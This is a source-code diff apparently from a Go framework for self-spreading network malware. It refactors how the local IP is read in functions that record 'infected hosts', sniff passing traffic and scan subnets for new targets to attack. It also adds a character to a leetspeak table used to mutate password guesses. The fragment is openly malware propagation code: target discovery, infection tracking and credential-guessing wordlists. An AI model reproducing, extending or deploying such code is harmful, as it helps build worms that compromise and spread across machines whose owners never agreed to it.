@@ -346,7 +346,7 @@ func IsHostInfected(target string) bool {
 		}
 		if resp.StatusCode() == fasthttp.StatusOK {
 			InfectedHosts = append(InfectedHosts, target)
-			InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
+			InfectedHosts = RemoveFromSlice(InfectedHosts, N.LocalIp)
 			NeuraxDebug("Found infected host: " + target)
 			return true
 		}
@@ -357,7 +357,7 @@ func IsHostInfected(target string) bool {
 		}
 		if rsp.StatusCode == 200 {
 			InfectedHosts = append(InfectedHosts, target)
-			InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
+			InfectedHosts = RemoveFromSlice(InfectedHosts, N.LocalIp)
 			NeuraxDebug("Found infected host: " + target)
 			return true
 		}
@@ -511,10 +511,10 @@ func neurax_scan_passive_single_iface(f func(string), iface string) {
 			ip, _ := ip_layer.(*layers.IPv4)
 			source := fmt.Sprintf("%s", ip.SrcIP)
 			destination := fmt.Sprintf("%s", ip.DstIP)
-			if source != GetLocalIp() && !IsHostInfected(source) && source != "255.255.255.255" {
+			if source != N.LocalIp && !IsHostInfected(source) && source != "255.255.255.255" {
 				go f(source)
 			}
-			if destination != GetLocalIp() && !IsHostInfected(destination) && destination != "255.255.255.255" {
+			if destination != N.LocalIp && !IsHostInfected(destination) && destination != "255.255.255.255" {
 				go f(destination)
 			}
 		}
@@ -562,7 +562,7 @@ func neurax_scan_active(f func(string)) {
 			targets = append(targets, addr)
 		}
 	}
-	targets = RemoveFromSlice(targets, GetLocalIp())
+	targets = RemoveFromSlice(targets, N.LocalIp)
 	if len(N.ScanFirst) != 0 {
 		targets = append(N.ScanFirst, targets...)
 	}
@@ -744,7 +744,7 @@ func WordBasicLeet(word string) []string {
 func WordFullLeet(word string) []string {
 	leets := map[string]string{
 		"a": "4", "b": "3", "g": "9", "o": "0",
-		"t": "7", "s": "5", "h": "#", "i": "1",
+		"t": "7", "s": "5", "S": "$", "h": "#", "i": "1",
 		"u": "v",
 	}
 	for k, v := range leets {
